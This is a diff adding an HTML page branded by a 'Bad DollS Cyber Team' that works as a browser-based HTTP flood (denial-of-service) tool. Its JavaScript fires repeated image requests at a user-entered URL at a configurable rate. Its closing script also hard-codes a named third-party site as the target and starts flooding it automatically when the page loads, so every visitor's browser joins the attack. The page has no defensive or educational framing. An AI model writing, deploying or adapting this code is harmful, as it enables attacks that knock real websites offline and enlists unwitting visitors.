@@ -1,0 +1,389 @@
+<html>
+
+<head>
+
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DOWN TO SERVER</title>
+
+<!--
+
+
+
+
+
+    /\                                                      
+
+   /  \   _ __   ___  _ __  _   _ _ __ ___   ___  _   _ ___
+
+  / /\ \ | '_ \ / _ \| '_ \| | | | '_ ` _ \ / _ \| | | / __|
+
+ / ____ \| | | | (_) | | | | |_| | | | | | | (_) | |_| \__ \
+
+/_/    \_\_| |_|\___/|_| |_|\__, |_| |_| |_|\___/ \__,_|___/
+
+                             __/ |                          
+
+                            |___/      
+
+
+
+
+
+Owaner : BadDolls
+
+
+
+
+
+
+
+-->
+
+<style type="text/css">
+
+
+
+
+
+body {
+
+    margin:5% 15%; background:url('') fixed right 50%; font-family:Courier New, Courier, monospace; color:#808080; background-attachment:fixed; background-repeat:repeat
+
+    }
+
+fieldset {
+
+    border-style: none;
+
+    margin: 10px;
+
+    }
+
+p {
+
+    margin: 0;
+
+    }
+
+input {
+
+    margin: 0;
+
+    background-color: transparent;
+
+    border: none;
+
+    text-align: center;
+
+    font-family:"Courier New", Courier, monospace;
+
+    color: green;
+
+    }
+
+</style>
+
+<script type="text/javascript">
+
+    function setAttributeOnload(object, attribute, val) {
+
+      if(window.addEventListener) {
+
+        window.addEventListener("load",
+
+          function(){ object[attribute] = val; }, false);
+
+      } else {
+
+        window.attachEvent('onload', function(){ object[attribute] = val; });
+
+      }
+
+    }
+
+  </script>
+
+</head>
+
+
+
+<div id="title" align="center"><font size="+3" color="red">[#</font><font size="5"><font color="purple">
+
+    ℘✪Bad DollS Cyber Team✪℘</font></font><font size="+3" color="red"> #]</font></div>
+
+
+
+<br><br>
+
+
+
+<div id="hive" align="center">
+
+<font color="red">[</font><font color="blue">Target</font><font color="red">]</font><br>
+
+<input name="target" id="targetURL" style="width: 100%;"value=""><br><br>
+
+
+
+<font color="red">[</font><font color="blue">PAKET</font><font color="red">]</font><br>
+
+<input id="rps" style="width: 100%;" value="9999999"><br><br>
+
+
+
+<fieldset>
+
+<font color="red">[</font><font color="blue">MESSAGE</font><font color="red">]</font><br>
+
+<input id="message" style="width: 100%;" value="DOWN TO SERVER" ><br><br>
+
+</fieldset>
+
+<font color="red">[</font><font color="blue"> STATUS </font><font color="red">]</font><br>
+
+
+
+<font color="brown"> PAKET </font><p id="requestedCtr"><font color="green">0</p>
+
+ SUCCES <p id="succeededCtr">0</p></font>
+
+<font color="brown"> ERROR </font><p id="failedCtr">0</p><br>
+
+<button id="fireButton" style="background-color:#000000; border-color: rgb(255, 255, 255); color: rgb(255, 255, 255);">
+
+STOP!</button><br><br><br>
+
+</div>
+
+<p align="center">
+
+
+
+  <script>
+
+        (function () {
+
+
+
+            var fireInterval;
+
+            var isFiring = false;
+
+        var currentTime = new Date()
+
+        var lastSuccess = currentTime.getTime();
+
+
+
+            var requestedCtrNode = document.getElementById("requestedCtr"),
+
+                succeededCtrNode = document.getElementById("succeededCtr"),
+
+                failedCtrNode = document.getElementById("failedCtr"),
+
+                targetURLNode = document.getElementById("targetURL"),
+
+                fireButton = document.getElementById("fireButton"),
+
+                messageNode = document.getElementById("message"),
+
+                rpsNode = document.getElementById("rps"),
+
+                timeoutNode = document.getElementById("timeout");
+
+
+
+            var targetURL = targetURLNode.value;
+
+            targetURLNode.onchange = function () {
+
+                targetURL = this.value;
+
+            };
+
+
+
+            var requestsHT = {}; //
+
+
+
+            var requestedCtr = 0,
+
+                succeededCtr = 0,
+
+                failedCtr = 0;
+
+
+
+            var makeHttpRequest = function () {
+
+
+
+                    if ( (currentTime.getTime()-lastSuccess) > 10000) { // Permite No Enviar mas de 1000 peticiones
+
+                        return;
+
+                    } else { lastSuccess = currentTime.getTime();};
+
+
+
+                    var rID =Number(new Date());
+
+                    var img = new Image();
+
+                    img.onerror = function () { onFail(rID); };
+
+                    img.onabort = function () { onFail(rID); };
+
+                    img.onload = function () { onSuccess(rID); }; //
+
+
+
+                    img.setAttribute("src", targetURL + "?id=" + rID + "&msg=" + messageNode.value);
+
+                    requestsHT[rID] = img;
+
+                    onRequest(rID);
+
+                };
+
+
+
+            var onRequest = function (rID) {
+
+                    requestedCtr++;
+
+                    requestedCtrNode.innerHTML = requestedCtr;
+
+                };
+
+
+
+            var onComplete = function (rID) {
+
+                    delete requestsHT[rID];
+
+                };
+
+
+
+            var onFail = function (rID) {
+
+                   // failedCtr++;
+
+                    //failedCtrNode.innerHTML = failedCtr;
+
+
+
+                    succeededCtr++; //
+
+                    succeededCtrNode.innerHTML = succeededCtr;
+
+
+
+
+
+                    delete requestsHT[rID]; //
+
+                };
+
+
+
+            var onSuccess = function (rID) {
+
+                    succeededCtr++;
+
+                    succeededCtrNode.innerHTML = succeededCtr;
+
+                    delete requestsHT[rID];
+
+                };
+
+
+
+            fireButton.onclick = function () {
+
+                if (isFiring) {
+
+                    clearInterval(fireInterval);
+
+
+
+                    isFiring = false;
+
+                    this.innerHTML = "START";
+
+                } else {
+
+                    isFiring = true;
+
+                    this.innerHTML = "STOP!";
+
+
+
+                    fireInterval = setInterval(makeHttpRequest, (1000 / parseInt(rpsNode.value) | 0));
+
+                }
+
+            };
+
+            function Firecrash() {
+
+                if (isFiring) {
+
+                    clearInterval(fireInterval);
+
+
+
+                    isFiring = false;
+
+                    this.innerHTML = "Atacar!";
+
+                } else {
+
+                    isFiring = true;
+
+                    this.innerHTML = "Stop flooding";
+
+
+
+                    fireInterval = setInterval(makeHttpRequest, (1000 / parseInt(rpsNode.value) | 0));
+
+                }
+
+            };
+
+//Cambiar Target y desconectar la funcion Firecrash();
+
+document.getElementById("targetURL").value = "http://xnxx.com/";
+
+Firecrash();
+
+
+
+        })();
+
+  </script>
+
+
+
+</p>
+
+<div id="footer" align="center">
+
+<p><font color="red"># [</font><font color="blue"></font><font color="red"></font><font color="blue"></font><font color="red">THANK YOU ALL MEMBER 
+℘✪Bad DollS Cyber Team✪℘]
+
+#</font></p>
+
+</div>
+
+<script>var _wau = _wau || []; _wau.push(["tab", "693u6svzfjac", "39l", "bottom-center"]);(function() { var s=document.createElement("script"); s.async=true; s.src="http://widgets.amung.us/tab.js";document.getElementsByTagName("head")
+
+[0].appendChild(s);})();</script>
+
+<script type="text/javascript">var _gaq=[]; _gaq.push(['_setAccount', 'UA-31585029-1']); _gaq.push(['_setDomainName', 'host.sk']); _gaq.push(['_trackPageview']); (function() { var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true; ga.src = 'http://www.google-analytics.com/ga.js'; var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);})();</script></body>
+
+</html>
